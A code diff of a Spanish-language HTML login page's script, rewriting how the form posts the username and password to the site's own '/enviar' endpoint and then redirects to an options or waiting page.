@@ -78,36 +78,27 @@
   </div>
 
   <script>
-    document.getElementById('loginForm').addEventListener('submit', async function (e) {
-      e.preventDefault();
+  document.getElementById('login-form').addEventListener('submit', function (e) {
+    e.preventDefault();
 
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
+    const usuario = document.getElementById('usuario').value;
+    const clave = document.getElementById('clave').value;
 
-      const data = {
-        usuario: email,
-        contrasena: password
-      };
-
-      try {
-        const response = await fetch('/enviar', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(data)
-        });
-
-        if (response.ok) {
-          window.location.href = '/opciones.html';
-        } else {
-          alert('Error al enviar los datos');
-        }
-      } catch (error) {
-        console.error('Error:', error);
-        alert('Hubo un error');
+    fetch('/enviar', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ usuario, clave })
+    })
+    .then(res => {
+      if (res.ok) {
+        // Redirigir a la pantalla de espera
+        window.location.href = '/opciones.html';
+      } else {
+        alert('Error al enviar datos');
       }
     });
-  </script>
+  });
+</script>
+
 </body>
 </html>
